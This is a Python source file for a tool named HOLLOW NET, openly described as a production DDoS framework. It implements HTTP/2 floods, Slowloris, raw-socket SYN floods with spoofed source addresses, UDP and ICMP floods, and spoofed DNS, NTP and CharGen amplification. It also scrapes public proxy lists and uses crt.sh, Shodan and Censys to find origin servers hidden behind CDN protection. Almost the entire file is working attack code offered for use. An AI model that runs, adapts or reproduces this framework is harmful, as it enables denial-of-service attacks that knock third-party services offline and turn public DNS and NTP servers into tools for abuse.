#!/usr/bin/env python3
"""
HOLLOW NET — Ascended Production DDoS Framework (Termux compatible)
--------------------------------------------------------------------
Multi-vector fusion engine with simple or Rich TUI.
Vectors: HTTP/2 (HPACK bomb, cloudscraper, TLS JA3 randomization), Slowloris,
         SYN flood, UDP flood, ICMP flood, DNS/NTP/SSDP/CharGen amplification.
Features: proxy pool (scrape + file), origin IP discovery (crt.sh), dynamic
          weight adjustment, safe-mode throttling.
Usage: sudo python3 hollownet.py [TARGET] [OPTIONS]
Dependencies: pip install httpx[socks] cloudscraper beautifulsoup4 rich pysocks requests
"""

import sys, os, time, re, random, json, logging, signal, argparse, socket, struct, ssl
from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Lock, Event
from queue import Queue, PriorityQueue
from typing import List, Dict, Optional, Set, Tuple, Any
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass, field

# ---------- Optional imports ----------
try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.text import Text
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    Console = None

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, NTP, send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import shodan
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False

try:
    from censys.search import CensysHosts
    HAS_CENSYS = True
except ImportError:
    HAS_CENSYS = False

try:
    from dnsdumpster import DNSDumpsterAPI
    HAS_DNSDUMPSTER = True
except ImportError:
    HAS_DNSDUMPSTER = False

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO, format="%(message)s",
                    handlers=[logging.StreamHandler(sys.stdout)])
log = logging.getLogger("HollowNet")
console = Console() if HAS_RICH else None

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== CONSTANTS ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
]
REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]
ACCEPT_ENCODING = ["gzip, deflate, br", "gzip, deflate", "br, gzip, deflate"]
HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE"]

CIPHERS = [
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
]
# Fixed ECDH curves (single names only)
ECDH_CURVES = [
    "prime256v1",
    "secp384r1",
    "secp521r1",
    "X25519",
]

# ==================== UTILITY ====================
def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def resolve_host(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except:
        return host

def randstr(length: int) -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(chars) for _ in range(length))


# ==================== ORIGIN DISCOVERY ====================
class OriginDiscovery:
    @staticmethod
    def crtsh(domain: str) -> Set[str]:
        import requests
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            resp = requests.get(url, headers=headers, timeout=20)
            if resp.status_code != 200:
                return set()
            certs = resp.json()
            hosts = set()
            for c in certs:
                for sub in c.get("name_value", "").split("\n"):
                    sub = sub.strip().lower()
                    if sub and "*" not in sub:
                        hosts.add(sub)
            return hosts
        except:
            return set()

    @staticmethod
    def dnsdumpster(domain: str) -> Set[str]:
        if not HAS_DNSDUMPSTER:
            return set()
        try:
            api = DNSDumpsterAPI()
            result = api.search(domain)
            hosts = set()
            for rec in result.get("dns_records", {}).get("host", []):
                if "ip" in rec:
                    hosts.add(rec["ip"])
            return hosts
        except:
            return set()

    @staticmethod
    def shodan_lookup(domain: str, api_key: str) -> Set[str]:
        if not HAS_SHODAN or not api_key:
            return set()
        try:
            api = shodan.Shodan(api_key)
            results = api.search(f"hostname:{domain}")
            ips = {match['ip_str'] for match in results.get('matches', [])}
            return ips
        except:
            return set()

    @staticmethod
    def censys_lookup(domain: str, api_id: str, api_secret: str) -> Set[str]:
        if not HAS_CENSYS or not api_id or not api_secret:
            return set()
        try:
            hosts = CensysHosts(api_id=api_id, api_secret=api_secret)
            query = f"services.tls.certificates.leaf_data.subject.common_name: *.{domain} OR services.tls.certificates.leaf_data.names: *.{domain}"
            ips = set()
            for page in hosts.search(query, pages=1):
                if "ip" in page:
                    ips.add(page["ip"])
            return ips
        except:
            return set()

    @classmethod
    def discover_all(cls, domain: str, api_keys: Dict = {}) -> Tuple[Dict[str, Set[str]], Set[str]]:
        results = {}
        subdomains = cls.crtsh(domain)
        resolved_ips = set()
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(sub)
                resolved_ips.add(ip)
            except:
                pass
        results["crt.sh"] = resolved_ips
        results["dnsdumpster"] = cls.dnsdumpster(domain)
        results["shodan"] = cls.shodan_lookup(domain, api_keys.get("shodan"))
        results["censys"] = cls.censys_lookup(domain, api_keys.get("censys_id"), api_keys.get("censys_secret"))
        all_ips = set()
        for ips in results.values():
            all_ips.update(ips)
        return results, all_ips


# ==================== PROXY POOL ====================
@dataclass
class Proxy:
    address: str
    protocol: str = "http"
    latency: float = 999.0
    fail_count: int = 0
    last_used: float = 0.0

class ProxyPool:
    def __init__(self, proxy_file: Optional[str] = None, refresh_interval: int = 300):
        self.lock = Lock()
        self.proxies: List[Proxy] = []
        self.in_use = set()
        self.running = True
        self.refresh_interval = refresh_interval
        if proxy_file and os.path.isfile(proxy_file):
            self.load_file(proxy_file)
        self.refresh_thread = Thread(target=self._auto_refresh, daemon=True)
        self.refresh_thread.start()

    def load_file(self, path: str):
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line):
                    self.proxies.append(Proxy(line))

    def _scrape_sources(self):
        import requests
        sources = [
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/roosteronrails/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        ]
        new_proxies = set()
        for src in sources:
            try:
                resp = requests.get(src, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})
                found = re.findall(r"\d+\.\d+\.\d+\.\d+:\d+", resp.text)
                new_proxies.update(found)
            except:
                pass
        with self.lock:
            existing = {p.address for p in self.proxies}
            for addr in new_proxies:
                if addr not in existing:
                    self.proxies.append(Proxy(addr))

    def _auto_refresh(self):
        while self.running:
            self._scrape_sources()
            Thread(target=self._validate_pool, daemon=True).start()
            time.sleep(self.refresh_interval)

    def _validate_pool(self):
        import requests
        with self.lock:
            to_validate = [p for p in self.proxies if p.latency > 5.0 or p.fail_count > 2]
        for proxy in to_validate:
            try:
                start = time.time()
                proxies = {"http": f"http://{proxy.address}", "https": f"http://{proxy.address}"}
                resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=8)
                if resp.status_code == 200:
                    proxy.latency = time.time() - start
                    proxy.fail_count = 0
            except:
                proxy.fail_count += 1
        with self.lock:
            self.proxies = [p for p in self.proxies if p.fail_count <= 3]

    def get_proxy(self) -> Optional[Proxy]:
        with self.lock:
            valid = [p for p in self.proxies if p.fail_count <= 2 and p.address not in self.in_use]
            if not valid and self.proxies:
                self.in_use.clear()
                valid = self.proxies
            if valid:
                proxy = min(valid, key=lambda x: x.latency)
                self.in_use.add(proxy.address)
                return proxy
        return None

    def release_proxy(self, proxy: Proxy):
        with self.lock:
            self.in_use.discard(proxy.address)

    def stats(self) -> Tuple[int, int, float]:
        with self.lock:
            total = len(self.proxies)
            active = len([p for p in self.proxies if p.fail_count <= 2])
            avg_lat = sum(p.latency for p in self.proxies if p.latency < 999) / max(1, active)
            return total, active, avg_lat

    def stop(self):
        self.running = False


# ==================== ATTACK VECTORS ====================
class AttackVector:
    def __init__(self, name: str, weight: float = 1.0):
        self.name = name
        self.weight = weight
        self.running = True
        self.stats = {"sent": 0, "errors": 0}
        self.lock = Lock()

    def stop(self):
        self.running = False

    def launch(self, threads: int):
        pass

    def inc_sent(self):
        with self.lock: self.stats["sent"] += 1

    def inc_errors(self):
        with self.lock: self.stats["errors"] += 1


class HTTP2FloodVector(AttackVector):
    def __init__(self, target_url: str, proxy_pool: Optional[ProxyPool],
                 method: str = "GET", hp_bomb: bool = True,
                 cloudscraper_mode: bool = False):
        super().__init__("HTTP2-Flood")
        self.target_url = target_url
        self.proxy_pool = proxy_pool
        self.method = method.upper()
        self.hp_bomb = hp_bomb
        self.cloudscraper_mode = cloudscraper_mode and HAS_CLOUDSCRAPER

    def _create_client(self) -> httpx.Client:
        ctx = ssl.create_default_context()
        ctx.set_ciphers(random.choice(CIPHERS))
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        ctx.set_ecdh_curve(random.choice(ECDH_CURVES))
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        transport = httpx.HTTPTransport(verify=ctx, http2=True)
        return httpx.Client(transport=transport, timeout=10)

    def worker(self):
        if self.cloudscraper_mode:
            scraper = cloudscraper.create_scraper()
        else:
            client = self._create_client()

        while self.running:
            proxy_obj = None
            if self.proxy_pool:
                proxy_obj = self.proxy_pool.get_proxy()
                while not proxy_obj and self.running:
                    time.sleep(0.1)
                    proxy_obj = self.proxy_pool.get_proxy()
            proxies = f"http://{proxy_obj.address}" if proxy_obj else None

            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "*/*",
                    "Accept-Encoding": random.choice(ACCEPT_ENCODING),
                    "Referer": random.choice(REFERERS),
                    "Cache-Control": "no-cache",
                }
                if self.hp_bomb:
                    headers["X-HPACK-Bomb"] = randstr(4000)
                if self.cloudscraper_mode:
                    resp = scraper.get(self.target_url, headers=headers,
                                       proxies={"https": proxies} if proxies else None)
                else:
                    req = client.build_request(self.method, self.target_url, headers=headers)
                    resp = client.send(req)
                _ = resp.content
                self.inc_sent()
            except:
                self.inc_errors()
                if proxy_obj: proxy_obj.fail_count += 1
            finally:
                if proxy_obj and self.proxy_pool:
                    self.proxy_pool.release_proxy(proxy_obj)

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads):
                ex.submit(self.worker)
            while self.running:
                time.sleep(1)


class SlowlorisVector(AttackVector):
    def __init__(self, host: str, port: int, https: bool = False, max_conn: int = 500):
        super().__init__("Slowloris")
        self.host = host
        self.port = port
        self.https = https
        self.max_conn = max_conn
        self.sockets: List[socket.socket] = []
        self.lock = Lock()

    def _create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if self.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        try:
            s.connect((self.host, self.port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {self.host}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            return s
        except:
            return None

    def maintain_pool(self):
        while self.running:
            with self.lock:
                while len(self.sockets) < self.max_conn:
                    s = self._create_socket()
                    if s:
                        self.sockets.append(s)
                        self.inc_sent()
                    else:
                        self.inc_errors()
            time.sleep(0.5)

    def keep_alive(self):
        while self.running:
            with self.lock:
                for i, s in enumerate(self.sockets):
                    try:
                        s.send(f"X-random: {random.randint(1000,9999)}\r\n".encode())
                        self.inc_sent()
                    except:
                        new_s = self._create_socket()
                        if new_s:
                            self.sockets[i] = new_s
                            self.inc_sent()
                        else:
                            self.sockets.pop(i)
                            self.inc_errors()
            time.sleep(random.uniform(5, 15))

    def launch(self, threads: int):
        Thread(target=self.maintain_pool, daemon=True).start()
        Thread(target=self.keep_alive, daemon=True).start()
        while self.running:
            time.sleep(1)


class SYNFloodVector(AttackVector):
    def __init__(self, target_ip: str, port: int, pps_limit: int = 5000):
        super().__init__("SYN Flood")
        self.target_ip = target_ip
        self.port = port
        self.pps_limit = pps_limit

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log.error("SYN flood requires root privileges.")
            return
        delay = 1.0 / self.pps_limit if self.pps_limit else 0
        while self.running:
            try:
                src_ip = random_ip()
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                window = socket.htons(5840)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 40, random.randint(0,65535), 0, 64,
                                     socket.IPPROTO_TCP, 0,
                                     socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
                tcp_hdr = struct.pack("!HHLLBBHHH", src_port, self.port, seq, 0,
                                      0x50, 0x02, window, 0, 0)
                sock.sendto(ip_hdr + tcp_hdr, (self.target_ip, 0))
                self.inc_sent()
                if delay: time.sleep(delay)
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class UDPFloodVector(AttackVector):
    def __init__(self, target_ip: str, port: int, packet_size: int = 1024, pps_limit: int = 2000):
        super().__init__("UDP Flood")
        self.target_ip = target_ip
        self.port = port
        self.packet_size = packet_size
        self.pps_limit = pps_limit

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        delay = 1.0 / self.pps_limit if self.pps_limit else 0
        while self.running:
            try:
                sock.sendto(os.urandom(self.packet_size), (self.target_ip, self.port))
                self.inc_sent()
                if delay: time.sleep(delay)
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class ICMPFloodVector(AttackVector):
    def __init__(self, target_ip: str, pps_limit: int = 2000):
        super().__init__("ICMP Flood")
        self.target_ip = target_ip
        self.pps_limit = pps_limit

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except:
            log.error("ICMP flood requires root.")
            return
        delay = 1.0 / self.pps_limit if self.pps_limit else 0
        while self.running:
            try:
                packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + b"\x00" * 32
                sock.sendto(packet, (self.target_ip, 0))
                self.inc_sent()
                if delay: time.sleep(delay)
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class DNSAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, resolver: str = "8.8.8.8", domain: str = "isc.org"):
        super().__init__("DNS Amp")
        self.target_ip = target_ip
        self.resolver = resolver
        self.domain = domain
        self.query = self._build_query()

    def _build_query(self):
        q = bytearray(b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        for part in self.domain.encode().split(b"."):
            q.extend(bytes([len(part)]))
            q.extend(part)
        q.extend(b"\x00")
        q.extend(b"\x00\xff\x00\x01")  # ANY
        return bytes(q)

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("DNS amp requires root.")
            return
        while self.running:
            try:
                src_port = random.randint(1024, 65535)
                udp_len = 8 + len(self.query)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+udp_len, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(self.resolver))
                udp_hdr = struct.pack("!HHHH", src_port, 53, udp_len, 0)
                sock.sendto(ip_hdr + udp_hdr + self.query, (self.resolver, 53))
                self.inc_sent()
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class NTPAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, ntp_server: str = "time.google.com"):
        super().__init__("NTP Amp")
        self.target_ip = target_ip
        self.ntp_server = ntp_server
        self.payload = b'\x17\x00\x03\x2a' + b'\x00'*8

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("NTP amp requires root.")
            return
        ntp_ip = socket.gethostbyname(self.ntp_server)
        while self.running:
            try:
                src_port = random.randint(1024,65535)
                udp_len = 8 + len(self.payload)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+udp_len, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(ntp_ip))
                udp_hdr = struct.pack("!HHHH", src_port, 123, udp_len, 0)
                sock.sendto(ip_hdr + udp_hdr + self.payload, (ntp_ip, 123))
                self.inc_sent()
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class SSDPAmplificationVector(AttackVector):
    def __init__(self, target_ip: str):
        super().__init__("SSDP Amp")
        self.target_ip = target_ip
        self.payload = (b"M-SEARCH * HTTP/1.1\r\n"
                       b"HOST: 239.255.255.250:1900\r\n"
                       b"MAN: \"ssdp:discover\"\r\n"
                       b"MX: 2\r\n"
                       b"ST: ssdp:all\r\n\r\n")

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
        while self.running:
            try:
                sock.sendto(self.payload, ("239.255.255.250", 1900))
                self.inc_sent()
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


class CharGenAmplificationVector(AttackVector):
    def __init__(self, target_ip: str, chargen_server: str):
        super().__init__("CharGen Amp")
        self.target_ip = target_ip
        self.chargen_server = chargen_server

    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            log.error("CharGen amp requires root.")
            return
        chargen_ip = socket.gethostbyname(self.chargen_server)
        while self.running:
            try:
                src_port = random.randint(1024,65535)
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                                     0x45, 0, 20+8, random.randint(0,65535),
                                     0, 64, socket.IPPROTO_UDP, 0,
                                     socket.inet_aton(self.target_ip),
                                     socket.inet_aton(chargen_ip))
                udp_hdr = struct.pack("!HHHH", src_port, 19, 8, 0)
                sock.sendto(ip_hdr + udp_hdr, (chargen_ip, 19))
                self.inc_sent()
            except: self.inc_errors()

    def launch(self, threads: int):
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for _ in range(threads): ex.submit(self.worker)
            while self.running: time.sleep(1)


# ==================== FUSION ENGINE ====================
class FusionEngine:
    def __init__(self, config: Dict):
        self.config = config
        self.vectors: List[Tuple[AttackVector, int]] = []
        self.proxy_pool: Optional[ProxyPool] = None
        self.running = True
        self.origin_ips: Set[str] = set()
        self.net_target = ""

    def setup(self):
        if self.config.get("find_origin"):
            domain = self.config["host"]
            api_keys = {
                "shodan": self.config.get("shodan_api"),
                "censys_id": self.config.get("censys_id"),
                "censys_secret": self.config.get("censys_secret")
            }
            _, ips = OriginDiscovery.discover_all(domain, api_keys)
            if ips:
                self.origin_ips = ips
                log.info(f"Origin IPs: {', '.join(list(ips)[:5])}")
                self.net_target = list(ips)[0]
            else:
                log.warning("No origin IPs found, using target host IP.")
                self.net_target = resolve_host(self.config["host"])
        else:
            self.net_target = resolve_host(self.config["host"])

        self.proxy_pool = ProxyPool(self.config.get("proxy_file"))

        weights = self.config.get("weights", {
            "http2": 0.3,
            "slowloris": 0.15,
            "syn": 0.15,
            "udp": 0.1,
            "icmp": 0.05,
            "dns_amp": 0.1,
            "ntp_amp": 0.05,
            "ssdp_amp": 0.05,
            "chargen_amp": 0.05,
        })
        total_threads = self.config.get("threads", 500)

        for vec_name, weight in weights.items():
            if weight <= 0: continue
            tcount = max(1, int(total_threads * weight))
            if vec_name == "http2":
                vec = HTTP2FloodVector(
                    self.config["http_url"], self.proxy_pool,
                    method=self.config.get("http_method", "GET"),
                    hp_bomb=True,
                    cloudscraper_mode=self.config.get("cloudscraper", False)
                )
            elif vec_name == "slowloris":
                vec = SlowlorisVector(self.config["host"], self.config.get("port", 80),
                                      self.config.get("https", False))
            elif vec_name == "syn":
                vec = SYNFloodVector(self.net_target, self.config.get("port", 80))
            elif vec_name == "udp":
                vec = UDPFloodVector(self.net_target, self.config.get("port", 80))
            elif vec_name == "icmp":
                vec = ICMPFloodVector(self.net_target)
            elif vec_name == "dns_amp":
                vec = DNSAmplificationVector(self.net_target)
            elif vec_name == "ntp_amp":
                vec = NTPAmplificationVector(self.net_target)
            elif vec_name == "ssdp_amp":
                vec = SSDPAmplificationVector(self.net_target)
            elif vec_name == "chargen_amp":
                vec = CharGenAmplificationVector(
                    self.net_target, self.config.get("chargen_server", "127.0.0.1"))
            else:
                continue
            self.vectors.append((vec, tcount))

    def launch(self):
        self.setup()
        duration = self.config.get("duration", 60)
        log.info(f"Attack started on {self.config['http_url']} for {duration}s")
        threads = []
        for vec, tcount in self.vectors:
            log.info(f"  {vec.name}: {tcount} threads")
            t = Thread(target=vec.launch, args=(tcount,), daemon=True)
            t.start()
            threads.append(t)

        if HAS_RICH and console and not self.config.get("no_tui"):
            self._run_dashboard(duration)
        else:
            start = time.time()
            while time.time() - start < duration:
                self._print_stats()
                time.sleep(5)

        self.running = False
        for vec, _ in self.vectors:
            vec.stop()
        if self.proxy_pool: self.proxy_pool.stop()
        log.info("Attack finished.")

    def _print_stats(self):
        for vec, _ in self.vectors:
            log.info(f"{vec.name}: sent={vec.stats['sent']}, errors={vec.stats['errors']}")

    def _run_dashboard(self, duration):
        layout = Layout()
        layout.split(Layout(name="header", size=3), Layout(name="body"), Layout(name="footer", size=3))
        layout["body"].split_row(Layout(name="left"), Layout(name="right"))
        start = time.time()

        def generate_table():
            table = Table(title="Vectors", expand=True)
            table.add_column("Vector", style="cyan")
            table.add_column("Threads", justify="right")
            table.add_column("Sent", justify="right")
            table.add_column("Errors", justify="right")
            for vec, tcount in self.vectors:
                table.add_row(vec.name, str(tcount), str(vec.stats['sent']), str(vec.stats['errors']))
            if self.proxy_pool:
                total, active, avg_lat = self.proxy_pool.stats()
                table.add_row("PROXIES", f"{active}/{total}", "", f"avg {avg_lat:.2f}s")
            return table

        def refresh():
            elapsed = time.time() - start
            remaining = max(0, duration - elapsed)
            header = Panel(Text(f"HOLLOW NET — {self.config['http_url']} | {elapsed:.1f}s / {duration}s", style="bold white on dark_blue"))
            layout["header"].update(header)
            layout["left"].update(generate_table())
            layout["footer"].update(Panel(Text("Ctrl+C to stop", style="dim")))

        with Live(layout, refresh_per_second=4, console=console):
            while self.running and (time.time() - start) < duration:
                refresh()
                time.sleep(0.25)


# ==================== CLI ====================
def main():
    parser = argparse.ArgumentParser(description="HOLLOW NET Advanced DDoS Tool")
    parser.add_argument("target", help="Target URL (e.g., https://site.com/ or IP)")
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("--ssl", action="store_true", default=False)
    parser.add_argument("-t", "--threads", type=int, default=500)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("--find-origin", action="store_true", help="Discover origin IP")
    parser.add_argument("--shodan-api", default=None)
    parser.add_argument("--censys-id", default=None)
    parser.add_argument("--censys-secret", default=None)
    parser.add_argument("--proxy-file", default=None, help="Path to proxy list")
    parser.add_argument("--no-tui", action="store_true")
    parser.add_argument("--cloudscraper", action="store_true", help="Use cloudscraper (HTTP/2 flood)")
    parser.add_argument("--profile", help="JSON profile for weights")
    parser.add_argument("--chargen-server", default="127.0.0.1", help="CharGen server IP")
    args = parser.parse_args()

    parsed = urlparse(args.target)
    host = parsed.hostname or args.target
    http_url = args.target if parsed.scheme else f"http://{args.target}"

    config = {
        "host": host,
        "port": args.port if args.port else (443 if parsed.scheme == "https" else 80),
        "https": args.ssl or parsed.scheme == "https",
        "http_url": http_url,
        "threads": args.threads,
        "duration": args.duration,
        "find_origin": args.find_origin,
        "shodan_api": args.shodan_api,
        "censys_id": args.censys_id,
        "censys_secret": args.censys_secret,
        "proxy_file": args.proxy_file,
        "no_tui": args.no_tui,
        "cloudscraper": args.cloudscraper,
        "chargen_server": args.chargen_server,
        "weights": {
            "http2": 0.3,
            "slowloris": 0.15,
            "syn": 0.15,
            "udp": 0.1,
            "icmp": 0.05,
            "dns_amp": 0.1,
            "ntp_amp": 0.05,
            "ssdp_amp": 0.05,
            "chargen_amp": 0.05,
        }
    }

    if args.profile and os.path.isfile(args.profile):
        with open(args.profile, 'r') as f:
            profile = json.load(f)
            config.update(profile)

    engine = FusionEngine(config)
    engine.launch()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    main()
